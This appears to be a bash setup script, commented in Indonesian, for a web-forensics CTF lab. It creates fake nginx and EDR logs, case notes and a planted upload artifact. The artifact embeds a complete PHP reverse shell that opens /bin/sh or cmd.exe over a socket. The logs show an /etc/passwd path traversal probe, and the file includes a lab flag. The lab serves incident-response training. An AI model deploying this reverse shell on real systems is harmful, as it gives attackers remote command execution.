#!/bin/bash
# ==============================================================================
# Script Generator Lab CTF: VM 1 - Suspicious Web Activity (Ubuntu 24.04)
# ==============================================================================

set -e

echo "[*] Menginisialisasi pembuatan direktori artefak..."
mkdir -p /var/log/nginx
mkdir -p /srv/lab/uploads
mkdir -p /var/log/edr

# 1. Membuat file Artefak Kasus (Simulasi Upload)
ARTIFACT_PATH="/srv/lab/uploads/report.php.txt"
cat << 'EOF' > "$ARTIFACT_PATH"
<?php
/* 
 * CTF LAB ARTIFACT - FOR INVESTIGATION PURPOSES ONLY
 * Created by: www-data
 * Purpose: Simulated file upload payload testing
 * Status: Non-executable plain text extension (.txt)
 * FLAG: FLAG{UBU01_WEB_ARTIFACT_58291A}
 */
echo "Report generated successfully at " . date('Y-m-d H:i:s');

// Copyright (c) 2020 Ivan Šincek
// v3.0
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
	private $addr  = null;
	private $port  = null;
	private $os    = null;
	private $shell = null;
	private $descriptorspec = array(
		0 => array('pipe', 'r'), // shell can read from STDIN
		1 => array('pipe', 'w'), // shell can write to STDOUT
		2 => array('pipe', 'w')  // shell can write to STDERR
	);
	private $buffer = 1024;  // read/write buffer size
	private $clen   = 0;     // command length
	private $error  = false; // stream read/write error
	private $sdump  = true;  // script's dump
	public function __construct($addr, $port) {
		$this->addr = $addr;
		$this->port = $port;
	}
	private function detect() {
		$detected = true;
		$os = strtoupper(PHP_OS);
		if (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {
			$this->os    = 'LINUX';
			$this->shell = '/bin/sh';
		} else if (stripos($os, 'WINDOWS') !== false || stripos($os, 'WINNT') !== false || stripos($os, 'WIN32') !== false) {
			$this->os    = 'WINDOWS';
			$this->shell = 'cmd.exe';
		} else {
			$detected = false;
			echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
		}
		return $detected;
	}
	private function daemonize() {
		$exit = false;
		if (!function_exists('pcntl_fork')) {
			echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
		} else if (($pid = @pcntl_fork()) < 0) {
			echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
		} else if ($pid > 0) {
			$exit = true;
			echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
			// once daemonized, you will actually no longer see the script's dump
		} else if (posix_setsid() < 0) {
			echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
		} else {
			echo "DAEMONIZE: Completed successfully!\n";
		}
		return $exit;
	}
	private function settings() {
		@error_reporting(0);
		@set_time_limit(0); // do not impose the script execution time limit
		@umask(0); // set the file/directory permissions - 666 for files and 777 for directories
	}
	private function dump($data) {
		if ($this->sdump) {
			$data = str_replace('<', '&lt;', $data);
			$data = str_replace('>', '&gt;', $data);
			echo $data;
		}
	}
	private function read($stream, $name, $bytes) {
		if (($data = @fread($stream, $bytes)) === false) { // suppress an error when reading from a closed blocking stream
			$this->error = true;                            // set the global error flag
			echo "STRM_ERROR: Cannot read from {$name}, script will now exit...\n";
		}
		return $data;
	}
	private function write($stream, $name, $data) {
		if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
			$this->error = true;                            // set the global error flag
			echo "STRM_ERROR: Cannot write to {$name}, script will now exit...\n";
		}
		return $bytes;
	}
	// read/write method for non-blocking streams
	private function rw($input, $output, $iname, $oname) {
		while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
			if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
			$this->dump($data); // script's dump
		}
	}
	// read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
	// we must read the exact byte length from a stream and not a single byte more
	private function brw($input, $output, $iname, $oname) {
		$size = fstat($input)['size'];
		if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
			// for some reason Windows OS pipes STDIN into STDOUT
			// we do not like that
			// so we need to discard the data from the stream
			while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
				$this->clen -= $bytes;
				$size -= $bytes;
			}
		}
		while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
			$size -= $bytes;
			$this->dump($data); // script's dump
		}
	}
	public function run() {
		if ($this->detect() && !$this->daemonize()) {
			$this->settings();

			// ----- SOCKET BEGIN -----
			$socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
			if (!$socket) {
				echo "SOC_ERROR: {$errno}: {$errstr}\n";
			} else {
				stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

				// ----- SHELL BEGIN -----
				$process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
				if (!$process) {
					echo "PROC_ERROR: Cannot start the shell\n";
				} else {
					foreach ($pipes as $pipe) {
						stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
					}

					// ----- WORK BEGIN -----
					$status = proc_get_status($process);
					@fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
					do {
						$status = proc_get_status($process);
						if (feof($socket)) { // check for end-of-file on SOCKET
							echo "SOC_ERROR: Shell connection has been terminated\n"; break;
						} else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
							echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
						}                                                                    // use proc_get_status() instead
						$streams = array(
							'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
							'write'  => null,
							'except' => null
						);
						$num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
						if ($num_changed_streams === false) {
							echo "STRM_ERROR: stream_select() failed\n"; break;
						} else if ($num_changed_streams > 0) {
							if ($this->os === 'LINUX') {
								if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
								if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
								if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
							} else if ($this->os === 'WINDOWS') {
								// order is important
								if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
								if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
								if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
							}
						}
					} while (!$this->error);
					// ------ WORK END ------

					foreach ($pipes as $pipe) {
						fclose($pipe);
					}
					proc_close($process);
				}
				// ------ SHELL END ------

				fclose($socket);
			}
			// ------ SOCKET END ------

		}
	}
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('127.0.0.1', 9000);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';



?>
EOF

# Atur kepemilikan dan hak akses file
chown -R www-data:www-data /srv/lab
chmod 644 "$ARTIFACT_PATH"

# Hitung hash SHA-256 secara dinamis dari file artefak
FILE_SHA256=$(sha256sum "$ARTIFACT_PATH" | awk '{print $1}')

echo "[*] Hash SHA-256 dari artefak: $FILE_SHA256"

# 2. Membuat Nginx Access Log (/var/log/nginx/access.log)
cat << 'EOF' > /var/log/nginx/access.log
192.168.10.15 - - [09/Oct/2026:14:10:05 +0000] "GET /index.php HTTP/1.1" 200 4523 "http://192.168.10.1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.10.20 - - [09/Oct/2026:14:12:18 +0000] "GET /static/style.css HTTP/1.1" 200 1250 "http://192.168.10.1/index.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
10.14.7.88 - - [09/Oct/2026:14:20:01 +0000] "GET /admin HTTP/1.1" 404 162 "-" "CyberTool/2.1 Scanner"
10.14.7.88 - - [09/Oct/2026:14:20:05 +0000] "GET /phpmyadmin HTTP/1.1" 404 162 "-" "CyberTool/2.1 Scanner"
10.14.7.88 - - [09/Oct/2026:14:20:12 +0000] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 400 280 "-" "CyberTool/2.1 Scanner"
10.14.7.88 - - [09/Oct/2026:14:22:10 +0000] "POST /upload.php HTTP/1.1" 200 142 "-" "CyberTool/2.1 Scanner"
10.14.7.88 - - [09/Oct/2026:14:23:05 +0000] "GET /uploads/report.php.txt HTTP/1.1" 200 238 "-" "CyberTool/2.1 Scanner"
192.168.10.15 - - [09/Oct/2026:14:24:00 +0000] "GET /dashboard.php HTTP/1.1" 200 3120 "http://192.168.10.1/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
EOF

# 3. Membuat Nginx Error Log (/var/log/nginx/error.log)
cat << 'EOF' > /var/log/nginx/error.log
2026/10/09 14:10:05 [notice] 1420#1420: *1 using inherited sockets from "6;7;"
2026/10/09 14:20:12 [error] 1432#1432: *3 FastCGI sent in stderr: "PHP message: PHP Warning:  file_get_contents(../../../../etc/passwd): Failed to open stream: Permission denied in /var/www/html/index.php on line 42" while reading response header from upstream, client: 10.14.7.88, server: localhost, request: "GET /index.php?page=../../../../etc/passwd HTTP/1.1", host: "10.0.2.15"
2026/10/09 14:22:10 [notice] 1580#1580: *4 [php-fpm] File upload processed: original_name="report.php.txt", destination="/srv/lab/uploads/report.php.txt", client_ip="10.14.7.88"
EOF

# 4. Membuat EDR Alert Log (/var/log/edr/alerts.log)
cat << EOF > /var/log/edr/alerts.log
{"timestamp": "2026-10-09T14:22:11Z", "event_id": 11, "event_type": "file_creation", "file_path": "/srv/lab/uploads/report.php.txt", "user": "www-data", "process_name": "php-fpm8.3", "pid": 1580, "sha256": "$FILE_SHA256", "severity": "MEDIUM", "rule_description": "New file created in web directory by webserver process"}
EOF

# 5. Membuat Case Notes (/srv/lab/case_notes.txt)
cat << 'EOF' > /srv/lab/case_notes.txt
===============================================================================
CASE NOTES - INCIDENT #2026-1009-WEB
===============================================================================
Deskripsi Kasus:
Pada tanggal 9 Oktober 2026 pukul 14:25:00 UTC, Tim SOC menerima peringatan dari 
sensor EDR mengenai pembuatan file baru di direktori aplikasi web internal (/srv/lab/uploads/).
Pada jendela waktu yang sama, terdeteksi lonjakan lalu lintas HTTP yang tidak lazim.

Infrastruktur Terkait:
- Subnet Internal Legitimate: 192.168.10.0/24
- Server Name: web-app-train-01 (Ubuntu 24.04 LTS)
- Web Server Log: /var/log/nginx/access.log & /var/log/nginx/error.log
- EDR Log: /var/log/edr/alerts.log

Tugas Analis:
Lakukan investigasi forensik pada artefak yang tersedia untuk menjawab pertanyaan insiden.
===============================================================================
EOF

# Mengatur izin baca seluruh artefak latihan agar dapat diakses pengguna non-root
chmod 644 /var/log/nginx/*.log
chmod 644 /var/log/edr/alerts.log
chmod 644 /srv/lab/case_notes.txt

echo "[+] Setup Lab Skenario 1 Berhasil!"
echo "[+] Artefak siap dianalisis di /var/log/nginx/, /var/log/edr/, dan /srv/lab/"
